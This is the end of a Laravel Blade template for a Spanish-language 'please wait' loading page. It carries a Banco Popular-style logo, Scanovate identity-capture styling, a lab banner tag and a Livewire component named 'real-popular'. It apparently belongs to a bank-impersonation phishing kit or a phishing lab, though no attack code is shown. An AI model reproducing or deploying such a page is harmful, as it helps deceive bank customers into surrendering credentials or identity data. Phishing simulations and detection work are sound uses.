            --scanovate-liveness-right-arrow-url: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTdweCIgaGVpZ2h0PSIyNnB4IiB2aWV3Qm94PSIwIDAgMTcgMjYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogc2tldGNodG9vbCA1Mi41ICg2NzQ2OSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+OTExRTY4REUtNjI1MS00QTA5LTg5QzEtOEVGRjZEM0JEM0RBPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBza2V0Y2h0b29sLjwvZGVzYz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpbnN0cmFjdGlvbnNfdHVybl9sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTcuMDAwMDAwLCAtMzUwLjAwMDAwMCkiIGZpbGw9IiMwMDU3RkYiPgogICAgICAgICAgICA8ZyBpZD0iYXJyb3dfbGVmdCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTcuOTAwMDAwLCAzNTAuMjAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0iR3JvdXAiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMC4xNDY3ODUxLDUuNjUwMDYxMSBDMTkuNDMyODI5OSw0LjkyNzQxNjYxIDE4LjI2NjI2MTgsNC45NTM0MjIzNiAxNy41NTk4MzI4LDUuNjY4NDQ5IEMxNy4zNjkzNDEsNS44NjEyNTkyNyA3LjgxMTI2ODY3LDE1LjUzODI4NTkgNy43MDI1MjczOSwxNS42NDgwODc5IEM2LjA4MTI3MDMsMTQuMDA2NTczOCAtMC41MDAwNDIxMzUsNy4zNDMzMjQwNCAtMi4xNjkzMTE0OSw1LjY1MzQ3NTk5IEMtMi45OTE3NDg0Niw0LjgyMDc2Njc5IC00LjQwOTUzNzQsNC45OTAxOTgxNiAtNS4wMTI2NzUxNSw2LjAwMDQ4MTk0IEMtNS40NjAwOTc0Nyw2Ljc0OTkyMDIyIC01LjMwMTI2NzczLDcuNjg0MDI1NTYgLTQuNzAxNTAzODIsOC4yOTEzNTE2NCBDLTQuMTE3NTcwOTgsOC44ODIzOTEzIDUuNDA1MjA1ODMsMTguNTIzNDMwMSA2LjE2NDU3ODA1LDE5LjI5MjMwNzEgQzYuMzYzODkzNzksMTkuNDk0MDQ4NiA2LjU1MTc5MDQsMTkuNjkzOTUxMyA2Ljc5NzMwMTcyLDE5Ljg0MjYzMDcgQzcuNTE1MTQ5ODMsMjAuMjc2ODQ3OCA4LjQzNjQ2NjEsMjAuMTA2MzY1NyA5LjAxMzkxMDgsMTkuNTIxODkzMSBDMTAuNjc1OTEzNCwxNy44MzkxMzc2IDIwLjA0OTcyMjUsOC4zNDg4Nzk1IDIwLjE0NjUyNTYsOC4yNTExNjA5NSBDMjAuODQ2NzI1OSw3LjU0MjE3NjA0IDIwLjg0NzUwNDUsNi4zNTkwNDYgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEgQzE5LjQzNzUwMTMsNC45MzI0MDc2MSAyMC44NTYzMjg0LDYuMzY4MjM5OTUgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEiIGlkPSJhcnJvd19sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3LjcwMTMzNCwgMTIuNjAzMDc3KSBzY2FsZSgxLCAtMSkgcm90YXRlKC0yNzAuMDAwMDAwKSB0cmFuc2xhdGUoLTcuNzAxMzM0LCAtMTIuNjAzMDc3KSAiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+');
            --scanovate-card-capture-back-arrow-color: white;
            --scanovate-card-capture-font: none;
            --scanovate-card-capture-loader-color: white;
            --scanovate-card-capture-popup-text-color: black;
            --scanovate-card-capture-primary-color: green;
            --scanovate-card-capture-popup-background-color: white;
            --scanovate-card-capture-instructions-background-color: black;
            --scanovate-card-capture-instructions-text-color: white;
            --n-100: #e9e9e9;
            --n-50: #f5f5f5;
            --n-200: #d9d9d9;
            --n-400: #9d9d9d;
            --n-300: #c4c4c4;
            --gray-3: #676767;
            --black-900: #000000;
            --white: #ffffff;
            --green-500: #11b719;
            --gb-500: #f5fdf4;
            --g-50: #d7f4d4;
            --s-900: #006e00;
            --green-corpo-600: #009a48;
            font-family: Inter, sans-serif;
            -webkit-font-smoothing: antialiased;
            -webkit-tap-highlight-color: transparent;
            text-align: left;
            cursor: pointer;
            outline: 0;
            margin: 0;
            padding: 0;
            border: 0;
            font-size: 100%;
            vertical-align: baseline;
            font-weight: 400;
            box-sizing: border-box;
            border-radius: 8px;
            height: 48px;
            border: 1px solid #d9d9d9;

        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: #00b800;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }



        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }
    </style>

</head>

<body style="background: #f5f5f5;">
<x-lab-banner />
    <div class="text-center py-4">
        <img src="/popular/logo_popular.png" width="220" height="38" alt="">
    </div>
    <br>
    <br>
    <div class="text-center mt-5">
        <div class="loading-spinner"></div>
    </div>
    <br>
    <div class="text-center">
        <p class="texto-1">Espere un momento por favor.</p>
    </div>





    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>

    <div>
        @livewire('real-popular')
    </div>
    @livewireScripts

</body>

</html>